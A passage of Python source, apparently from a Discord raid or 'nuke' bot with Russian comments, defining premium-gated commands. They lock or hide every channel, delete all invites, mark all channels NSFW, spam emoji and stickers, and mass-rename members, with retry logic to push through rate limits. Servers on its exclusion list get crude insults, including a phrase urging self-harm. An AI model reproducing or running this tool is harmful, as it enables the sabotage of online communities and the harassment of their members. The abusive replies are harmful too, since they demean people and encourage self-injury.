    if guild.id in server_blacklist:
        await ctx.send("Команда close_server не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда close_server запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Ахуел, свой вены вскрой")
        console.print(f"[info]🔍 Команда close_server запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: Эта команда доступна только для пользователей premium.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !close_server запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !close_server для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    voice_channels = [channel for channel in guild.channels if isinstance(channel, discord.VoiceChannel)]
    successful_count = 0
    failed_count = 0
    failed_channels = []

    async def disable_text_channel(channel):
        nonlocal successful_count, failed_count, failed_channels
        try:
            async with limiter:
                await channel.set_permissions(guild.default_role, send_messages=False)
            console.print(f"[success]✅ Отключено право писать в канале '{channel.name}'[/]")
            successful_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет разрешения на отключение права писать в канале '{channel.name}'[/]")
            failed_count += 1
            failed_channels.append(channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при отключении канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.set_permissions(guild.default_role, send_messages=False)
                console.print(f"[success]✅ Право писать в канале '{channel.name}' отключено после повторной попытки[/]")
                successful_count += 1
            else:
                console.print(f"[error]❌ Ошибка при отключении канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при отключении канала '{channel.name}': {e}[/]")
            failed_count += 1
            failed_channels.append(channel.name)

    async def disable_voice_channel(channel):
        nonlocal successful_count, failed_count, failed_channels
        try:
            async with limiter:
                await channel.set_permissions(guild.default_role, connect=False)
            console.print(f"[success]✅ Отключено право подключаться к каналу '{channel.name}'[/]")
            successful_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет разрешения на отключение права подключаться к каналу '{channel.name}'[/]")
            failed_count += 1
            failed_channels.append(channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при отключении канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.set_permissions(guild.default_role, connect=False)
                console.print(f"[success]✅ Право подключаться к каналу '{channel.name}' отключено после повторной попытки[/]")
                successful_count += 1
            else:
                console.print(f"[error]❌ Ошибка при отключении канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при отключении канала '{channel.name}': {e}[/]")
            failed_count += 1
            failed_channels.append(channel.name)

    await asyncio.gather(*(disable_text_channel(channel) for channel in text_channels))
    await asyncio.gather(*(disable_voice_channel(channel) for channel in voice_channels))

    final_message = f"Successfully disabled {successful_count} channels. Failed to disable {failed_count} channels!"
    if guild.me.guild_permissions.administrator:
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")
    else:
        await ctx.send("The bot does not have enough rights to disable some channels.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !close_server на сервере {guild.name} ({guild.id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def unlock_server(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда unlock_server не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда unlock_server запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Сосни хуйца у своего отчима.")
        console.print(f"[info]🔍 Команда unlock_server запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: Эта команда доступна только для пользователей premium.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !unlock_server запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !unlock_server для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    voice_channels = [channel for channel in guild.channels if isinstance(channel, discord.VoiceChannel)]
    successful_count = 0
    failed_count = 0
    failed_channels = []

    async def enable_text_channel(channel):
        nonlocal successful_count, failed_count, failed_channels
        try:
            async with limiter:
                await channel.set_permissions(guild.default_role, send_messages=True)
            console.print(f"[success]✅ Восстановлено право писать в канале '{channel.name}'[/]")
            successful_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет разрешения на восстановление права писать в канале '{channel.name}'[/]")
            failed_count += 1
            failed_channels.append(channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при восстановлении канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.set_permissions(guild.default_role, send_messages=True)
                console.print(f"[success]✅ Право писать в канале '{channel.name}' восстановлено после повторной попытки[/]")
                successful_count += 1
            else:
                console.print(f"[error]❌ Ошибка при восстановлении канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при восстановлении канала '{channel.name}': {e}[/]")
            failed_count += 1
            failed_channels.append(channel.name)

    async def enable_voice_channel(channel):
        nonlocal successful_count, failed_count, failed_channels
        try:
            async with limiter:
                await channel.set_permissions(guild.default_role, connect=True)
            console.print(f"[success]✅ Восстановлено право подключаться к каналу '{channel.name}'[/]")
            successful_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет разрешения на восстановление права подключаться к каналу '{channel.name}'[/]")
            failed_count += 1
            failed_channels.append(channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при восстановлении канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.set_permissions(guild.default_role, connect=True)
                console.print(f"[success]✅ Право подключаться к каналу '{channel.name}' восстановлено после повторной попытки[/]")
                successful_count += 1
            else:
                console.print(f"[error]❌ Ошибка при восстановлении канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при восстановлении канала '{channel.name}': {e}[/]")
            failed_count += 1
            failed_channels.append(channel.name)

    await asyncio.gather(*(enable_text_channel(channel) for channel in text_channels))
    await asyncio.gather(*(enable_voice_channel(channel) for channel in voice_channels))

    final_message = f"Successfully restored write permissions to {successful_count} channels. Failed to restore write permissions to {failed_count} channels!"
    if guild.me.guild_permissions.administrator:
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")
    else:
        await ctx.send("The bot does not have sufficient rights to restore some channels.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !unlock_server на сервере {guild.name} ({guild.id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def server_lockdown(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда server_lockdown не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда server_lockdown запрещена[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Даун чтоли, 1000р и ок можешь")
        console.print(f"[info]🔍 Команда server_lockdown запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: Эта команда доступна только для пользователей premium.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !server_lockdown запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !server_lockdown для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    channels = guild.channels
    successful_count = 0
    failed_count = 0
    failed_channels = []

    async def hide_channel(channel):
        nonlocal successful_count, failed_count, failed_channels
        try:
            async with limiter:
                await channel.set_permissions(guild.default_role, read_messages=False)
            console.print(f"[success]✅ Скрыт канал '{channel.name}'[/]")
            successful_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет разрешения на скрытие канала '{channel.name}'[/]")
            failed_count += 1
            failed_channels.append(channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при скрытии канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.set_permissions(guild.default_role, read_messages=False)
                console.print(f"[success]✅ Канал '{channel.name}' скрыт после повторной попытки[/]")
                successful_count += 1
            else:
                console.print(f"[error]❌ Ошибка при скрытии канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)
        except Exception as e:
            console.print(f"[error]❌ Неизвестная ошибка при скрытии канала '{channel.name}': {e}[/]")
            failed_count += 1
            failed_channels.append(channel.name)

    await asyncio.gather(*(hide_channel(channel) for channel in channels))

    final_message = f"Successfully hidden {successful_count} channels. Failed to hide {failed_count} channels!"
    if guild.me.guild_permissions.administrator:
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")
    else:
        await ctx.send("The bot does not have enough rights to hide some channels.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !server_lockdown на сервере {guild.name} ({guild.id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def show_channels(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда show_channels не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда show_channels запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Вскрой свою сестру")
        console.print(f"[info]🔍 Команда show_channels запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: Эта команда доступна только для пользователей premium.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !show_channels запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !show_channels для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    channels = guild.channels
    successful_count = 0
    failed_count = 0
    failed_channels = []

    async def unhide_channel(channel):
        nonlocal successful_count, failed_count, failed_channels
        try:
            async with limiter:
                await channel.set_permissions(guild.default_role, read_messages=True)
            console.print(f"[success]✅ Открыт канал '{channel.name}'[/]")
            successful_count += 1
        except discord.Forbidden:
            console.print(f"[error]❌ Нет разрешения на открытие канала '{channel.name}'[/]")
            failed_count += 1
            failed_channels.append(channel.name)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                console.print(f"[warning]⏳ Rate limit при открытии канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                async with limiter:
                    await channel.set_permissions(guild.default_role, read_messages=True)
                console.print(f"[success]✅ Канал '{channel.name}' открыт после повторной попытки[/]")
                successful_count += 1
            else:
                console.print(f"[error]❌ Error opening channel '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)
        except Exception as e:
            console.print(f"[error]❌ Unknown error opening channel '{channel.name}': {e}[/]")
            failed_count += 1
            failed_channels.append(channel.name)

    await asyncio.gather(*(unhide_channel(channel) for channel in channels))

    final_message = f"Successfully opened {successful_count} channels. Failed to open {failed_count} channels!"
    if guild.me.guild_permissions.administrator:
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")
    else:
        await ctx.send("The bot does not have enough rights to open some channels.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !show_channels на сервере {guild.name} ({guild.id})[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def invs_delete(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда invs_delete не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда invs_delete запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Ай да ладно")
        console.print(f"[info]🔍 Команда invs_delete запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=0xff0000)
        await ctx.send(embed=embed)
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) не премиум-пользователь, доступ к !invs_delete запрещён[/]")
        return

    console.print(f"[action]🔧 Запуск команды !invs_delete для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        invites = await guild.invites()
        if not invites:
            await ctx.send("There are no invitations.")
            console.print(f"[warning]⚠️ Нет приглашений на сервере {guild.name} ({guild.id})[/]")
            return

        invite_count = 0
        failed_invites = []

        async def delete_invite(invite):
            nonlocal invite_count, failed_invites
            try:
                async with limiter:
                    await invite.delete()
                console.print(f"[success]✅ Приглашение {invite.url} удалено[/]")
                invite_count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на удаление приглашения {invite.url}[/]")
                failed_invites.append(invite.url)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при удалении приглашения {invite.url}, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await invite.delete()
                    console.print(f"[success]✅ Приглашение {invite.url} удалено после повторной попытки[/]")
                    invite_count += 1
                else:
                    console.print(f"[error]❌ Ошибка при удалении приглашения {invite.url}: {e}[/]")
                    failed_invites.append(invite.url)
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при удалении приглашения {invite.url}: {e}[/]")
                failed_invites.append(invite.url)

        await asyncio.gather(*(delete_invite(invite) for invite in invites))

        final_message = f"Successfully removed {invite_count} invitations! Failed to remove {failed_invites} invitations!"
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to delete invites on this server.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !invs_delete на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды !invs_delete на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def nsfw_all(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда nsfw_all не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда nsfw_all запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("18+ только на порнхабе, здесь нельзя.")
        console.print(f"[info]🔍 Команда nsfw_all запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !nsfw_all для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
        nsfw_count = 0
        failed_count = 0
        failed_channels = []

        async def set_nsfw(channel):
            nonlocal nsfw_count, failed_count, failed_channels
            try:
                async with limiter:
                    await channel.edit(nsfw=True)
                console.print(f"[success]✅ Установлен NSFW-статус для канала '{channel.name}'[/]")
                nsfw_count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на изменение NSFW-статуса канала '{channel.name}'[/]")
                failed_count += 1
                failed_channels.append(channel.name)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при изменении NSFW-статуса канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await channel.edit(nsfw=True)
                    console.print(f"[success]✅ NSFW-статус для канала '{channel.name}' установлен после повторной попытки[/]")
                    nsfw_count += 1
                else:
                    console.print(f"[error]❌ Ошибка при изменении NSFW-статуса канала '{channel.name}': {e}[/]")
                    failed_count += 1
                    failed_channels.append(channel.name)
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при изменении NSFW-статуса канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)

        await asyncio.gather(*(set_nsfw(channel) for channel in channels))

        final_message = f"Successfully set NSFW status for {nsfw_count} channels! Failed to change NSFW status for {failed_count} channels!"
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to change the NSFW status of channels on this server.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !nsfw_all на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды !nsfw_all на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def unnsfw_all(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда unnsfw_all не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда unnsfw_all запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Сосо, бро.")
        console.print(f"[info]🔍 Команда unnsfw_all запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !unnsfw_all для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
        unnsfw_count = 0
        failed_count = 0
        failed_channels = []

        async def remove_nsfw(channel):
            nonlocal unnsfw_count, failed_count, failed_channels
            try:
                async with limiter:
                    await channel.edit(nsfw=False)
                console.print(f"[success]✅ Снят NSFW-статус с канала '{channel.name}'[/]")
                unnsfw_count += 1
            except discord.Forbidden:
                console.print(f"[error]❌ Нет разрешения на изменение NSFW-статуса канала '{channel.name}'[/]")
                failed_count += 1
                failed_channels.append(channel.name)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                    console.print(f"[warning]⏳ Rate limit при снятии NSFW-статуса канала '{channel.name}', ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    async with limiter:
                        await channel.edit(nsfw=False)
                    console.print(f"[success]✅ NSFW-статус с канала '{channel.name}' снят после повторной попытки[/]")
                    unnsfw_count += 1
                else:
                    console.print(f"[error]❌ Ошибка при снятии NSFW-статуса канала '{channel.name}': {e}[/]")
                    failed_count += 1
                    failed_channels.append(channel.name)
            except Exception as e:
                console.print(f"[error]❌ Неизвестная ошибка при снятии NSFW-статуса канала '{channel.name}': {e}[/]")
                failed_count += 1
                failed_channels.append(channel.name)

        await asyncio.gather(*(remove_nsfw(channel) for channel in channels))

        final_message = f"Successfully removed NSFW status from {unnsfw_count} channels! Failed to change NSFW status for {failed_count} channels!"
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have permission to change the NSFW status of channels on this server.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !unnsfw_all на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды !unnsfw_all на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def emoji(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда emoji не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда emoji запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Эмодзи своей мамаши покажи сначала.")
        console.print(f"[info]🔍 Команда emoji запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !emoji для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        emoji_name = default_config.get("emoji_name", "msc")
        num_emojis = default_config.get("num_emojis", 50)
        icon_path = default_config.get("icon_path", "icon.png")

        try:
            with open(icon_path, "rb") as img:
                img_byte = img.read()
        except FileNotFoundError:
            await ctx.send(f"Image file {icon_path} not found.")
            console.print(f"[error]❌ Файл изображения {icon_path} не найден[/]")
            return
        except Exception as e:
            await ctx.send("Error reading image file.")
            console.print(f"[error]❌ Ошибка при чтении файла {icon_path}: {e}[/]")
            return

        success_count = 0
        failed_count = 0
        failed_emojis = []

        async def create_emoji(index):
            nonlocal success_count, failed_count, failed_emojis
            for attempt in range(5):  
                try:
                    async with limiter:
                        emoji = await guild.create_custom_emoji(name=f"{emoji_name}_{index}", image=img_byte)
                    console.print(f"[success]✅ Эмодзи '{emoji.name}' успешно создан[/]")
                    success_count += 1
                    break
                except discord.Forbidden:
                    console.print(f"[error]❌ Нет разрешения на создание эмодзи '{emoji_name}_{index}'[/]")
                    failed_count += 1
                    failed_emojis.append(f"{emoji_name}_{index}")
                    break
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                        console.print(f"[warning]⏳ Rate limit при создании эмодзи '{emoji_name}_{index}', ждем {retry_after:.2f} секунд...[/]")
                        await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    else:
                        console.print(f"[error]❌ Ошибка при создании эмодзи '{emoji_name}_{index}': {e}[/]")
                        failed_count += 1
                        failed_emojis.append(f"{emoji_name}_{index}")
                        break
                except Exception as e:
                    console.print(f"[error]❌ Неизвестная ошибка при создании эмодзи '{emoji_name}_{index}': {e}[/]")
                    failed_count += 1
                    failed_emojis.append(f"{emoji_name}_{index}")
                    break

        tasks = [create_emoji(i) for i in range(1, num_emojis + 1)]
        await asyncio.gather(*tasks)

        final_message = f"{success_count} emoji oprettet! {failed_count} emoji kunne ikke oprettes."
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have sufficient permissions to create emoji on this server.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !emoji на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred while executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды !emoji на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.guild)
async def stickers(ctx):
    guild = ctx.guild
    if guild.id in server_blacklist:
        await ctx.send("Команда stickers не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда stickers запрещена[/]")
        return

    if guild.id in excluded_server_id:
        await ctx.send("Стикеры своего отца покажи сначала.")
        console.print(f"[info]🔍 Команда stickers запрещена на сервере {guild.name} ({guild.id}) из excluded_server_ids[/]")
        return

    console.print(f"[action]🔧 Запуск команды !stickers для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})[/]")

    try:
        sticker_name = default_config.get("sticker_name", "msc")
        num_stickers = default_config.get("num_stickers", 30)
        sticker_description = default_config.get("sticker_description", "msc")
        sticker_tags = default_config.get("sticker_tags", "funny")
        icon_path = default_config.get("icon_path", "icon.png")

        try:
            with open(icon_path, "rb") as img:
                img_data = img.read()
        except FileNotFoundError:
            await ctx.send(f"The image file {icon_path} was not found.")
            console.print(f"[error]❌ Файл изображения {icon_path} не найден[/]")
            return
        except Exception as e:
            await ctx.send("Fejl ved læsning af billedfil.")
            console.print(f"[error]❌ Ошибка при чтении файла {icon_path}: {e}[/]")
            return

        success_count = 0
        failed_count = 0
        failed_stickers = []

        async def create_sticker(index):
            nonlocal success_count, failed_count, failed_stickers
            for attempt in range(5): 
                try:
                    async with limiter:
                        sticker = await guild.create_sticker(
                            name=f"{sticker_name}_{index}",
                            description=sticker_description,
                            emoji="😄", 
                            file=discord.File(io.BytesIO(img_data), filename="sticker.png")
                        )
                    console.print(f"[success]✅ Стикер '{sticker.name}' успешно создан[/]")
                    success_count += 1
                    break
                except discord.Forbidden:
                    console.print(f"[error]❌ Нет разрешения на создание стикера '{sticker_name}_{index}'[/]")
                    failed_count += 1
                    failed_stickers.append(f"{sticker_name}_{index}")
                    break
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
                        console.print(f"[warning]⏳ Rate limit при создании стикера '{sticker_name}_{index}', ждем {retry_after:.2f} секунд...[/]")
                        await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                    else:
                        console.print(f"[error]❌ Ошибка при создании стикера '{sticker_name}_{index}': {e}[/]")
                        failed_count += 1
                        failed_stickers.append(f"{sticker_name}_{index}")
                        break
                except Exception as e:
                    console.print(f"[error]❌ Неизвестная ошибка при создании стикера '{sticker_name}_{index}': {e}[/]")
                    failed_count += 1
                    failed_stickers.append(f"{sticker_name}_{index}")
                    break

        tasks = [create_sticker(i) for i in range(1, num_stickers + 1)]
        await asyncio.gather(*tasks)

        final_message = f"Successfully created {success_count} stickers! Failed to create {failed_count} stickers."
        await ctx.send(final_message)
        console.print(f"[success]✅ {final_message}[/]")

    except discord.Forbidden:
        await ctx.send("The bot does not have enough permissions to create stickers on this server.")
        console.print(f"[error]❌ Недостаточно прав у бота для выполнения команды !stickers на сервере {guild.name} ({guild.id})[/]")
    except Exception as e:
        await ctx.send("An error occurred when executing the command.")
        console.print(f"[error]❌ Неизвестная ошибка при выполнении команды !stickers на сервере {guild.name} ({guild.id}): {e}[/]")

@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def massnick(ctx, *, nickname: str):
    guild = ctx.guild
    if ctx.guild.id in server_blacklist:
        await ctx.send("Команда massnick не может быть использована на этом сервере.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в server_blacklist, команда massnick запрещена! 😿[/]")
        return

    if ctx.guild.id in excluded_server_id:
        await ctx.send("Ник своей мамаше в Steam поменяешь.")
        console.print(f"[error]❌ Сервер {guild.name} ({guild.id}) в excluded_server_ids, команда massnick запрещена[/]")
        return

    if ctx.author.id not in premium_users:
        embed = discord.Embed(description=":x: This command is only available to premium users.", color=discord.Colour.from_rgb(255, 0, 0))
        await ctx.send(embed=embed)
        console.print(f"[error]❌ Пользователь {ctx.author.name} ({ctx.author.id}) не в premium_users, доступ к massnick запрещён[/]")
        return

    if not ctx.guild.me.guild_permissions.manage_nicknames:
        await ctx.send("I do not have permission to change the nicknames of members on this server.")
        console.print(f"[error]❌ Недостаточно прав для команды massnick на сервере {guild.name} ({guild.id})[/]")
        return

    console.print(f"[action]📝 Запуск команды massnick для {ctx.author.name} ({ctx.author.id}) на сервере {guild.name} ({guild.id})...[/]")

    try:
        members = ctx.guild.members
        success_count = 0
        failed_count = 0

        async def change_nick(member):
            nonlocal success_count, failed_count
            try:
                async with limiter:
                    await member.edit(nick=nickname)
                    success_count += 1
                    console.print(f"[success]✅ Никнейм изменён для {member.name} ({member.id}) на '{nickname}'[/]")
            except discord.Forbidden:
                failed_count += 1
                console.print(f"[error]❌ Нет прав для изменения никнейма {member.name} ({member.id})[/]")
            except discord.HTTPException as e:
                failed_count += 1
                if e.status == 429:
                    retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.1))
                    console.print(f"[warning]⏳ Rate limit при изменении никнейма {member.name}, ждем {retry_after:.2f} секунд...[/]")
                    await asyncio.sleep(retry_after + random.uniform(0.01, 0.1))
                    try:
                        async with limiter:
                            await member.edit(nick=nickname)
                            success_count += 1
                            console.print(f"[success]✅ Никнейм изменён для {member.name} ({member.id}) после повторной попытки[/]")
                    except Exception:
                        console.print(f"[error]❌ Повторная попытка изменения никнейма для {member.name} ({member.id}) не удалась[/]")
                else:
                    console.print(f"[error]❌ Ошибка HTTP при изменении никнейма {member.name} ({member.id}): {e}[/]")
            except Exception as e:
                failed_count += 1
                console.print(f"[error]❌ Неизвестная ошибка при изменении никнейма {member.name} ({member.id}): {e}[/]")

        tasks = [change_nick(member) for member in members]
        await asyncio.gather(*tasks, return_exceptions=True)

